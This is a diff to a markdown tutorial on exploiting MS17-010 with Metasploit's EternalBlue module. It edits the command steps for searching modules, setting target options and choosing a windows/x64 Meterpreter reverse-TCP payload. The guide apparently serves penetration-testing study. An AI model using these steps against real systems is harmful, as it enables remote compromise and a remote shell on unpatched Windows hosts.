@@ -20,10 +20,16 @@ Open a terminal and launch Metasploit by typing:
 msfconsole
 ```
 
-Once inside Metasploit, you can search for the EternalBlue module using:
+### View all available command in Metasploit using:
 
 ```bash
-show module
+help
+```
+
+### Search EternalBlue exploits module using:
+
+```bash
+show exploits
 ```
 
 ## 3. Search for the MS17-010 EternalBlue Exploit Module
@@ -42,7 +48,7 @@ use exploit/windows/smb/ms17_010_eternalblue
 
 ## 5. Set Required Parameters
 
-Configure necessary parameters by employing the show options command to view and adjust settings as needed. Common options include `RHOSTS`,`LHOST`, `RPORT`, etc.
+Configure necessary parameters by employing the `show options` command to view and adjust settings as needed. Common options include `RHOSTS`,`LHOST`, `RPORT`, etc.
 
 ```bash
 set RHOSTS <Target IP>
@@ -61,7 +67,7 @@ After selecting the exploit module, you need to set the payload that will be del
 For example, to set the payload as a reverse shell for a Windows target:
 
 ```bash
-set payload windows/meterpreter/reverse_tcp
+set payload windows/x64/meterpreter/reverse_tcp
 ```
 
 ## 7. Execute the Exploit
